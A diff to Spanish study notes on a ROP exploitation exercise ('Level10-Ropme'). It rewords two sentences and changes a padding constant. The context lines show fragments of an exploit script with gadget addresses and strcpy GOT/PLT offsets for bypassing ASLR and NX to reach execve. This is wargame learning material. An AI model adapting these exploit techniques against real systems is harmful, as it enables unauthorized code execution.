@@ -7,7 +7,7 @@ Para aprender: Http://danigargu.blogspot.com.es/2013/01/having-fun-with-rop-nxas
 
 
 Básicamente se trata de seguir la guia de arriba, está muy bien escrita, todo un crack el que hace ese blog.
-Se basa de seguir el ejercicio Level10-Ropme.
+Se trata de seguir el ejercicio Level10-Ropme.
 
 **1.- Usar ropeme(ropshell.py) para encontrar gagdgets con los que ir saltando de ret en ret para adecuar los registros y la pila a una llamada a execve**
 
@@ -177,7 +177,7 @@ Todo lo anterior está muy bien, pero si no tenemos una sección no randomizable
 Ref: http://danigargu.blogspot.com.es/2013/02/got-dereferencing-overwriting-aslrnx.html	
 Ref: ROP-libc.pdf
 
-Lo que sigue es casi un copia y pega de las refencias anteriores. 
+Lo que sigue es casi un copia y pega del blog, porque yo no podría explicarlo mejor. 
 
 Como ver las propiedades de las secciones del binario:
 ```
@@ -393,7 +393,7 @@ gadget5 = pack('<I', 0x804845f) # (5) call eax ; leave ;;
 
 # OPERACIONES CONDICIONADAS POR LOS GADGETS
 
-padding = 0xcafedeef
+padding = 0xdeadbeef
 offset = 0xfffb3840 - 0x8			# El offset hay que calcularlo en gdb, no funciona lo anterior
 data = (0x08049720-0x5d5b04c4) & 0xFFFFFFFF 	# 0xaaa9925c
 strcpy_got = (0x08049710+0xb8a0008)            	# 0x138E9718 strcpy@GOT + 0xb8a0008 for the gadget (4)
@@ -476,7 +476,7 @@ gadget2 = pack('<I', 0x804842b) # (2) xchg edi eax ; add al 0x8 ; add [ebx+0x5d5
 
 # OPERACIONES CONDICIONADAS POR LOS GADGETS
 
-padding = 0xcafedeef
+padding = 0xdeadbeef
 offset = 0xfffb3840 - 0x8				# El offset hay que calcularlo en gdb, no funciona lo anterior
 strcpy_got = (0x08049710-0x5d5b04c4) & 0xFFFFFFFF       # 0xaaa9924c = strcpy@GOT - 0x5d5b04c4 for the gadget (2)
 strcpy_plt = 0x08048368					# strcpy@PLT
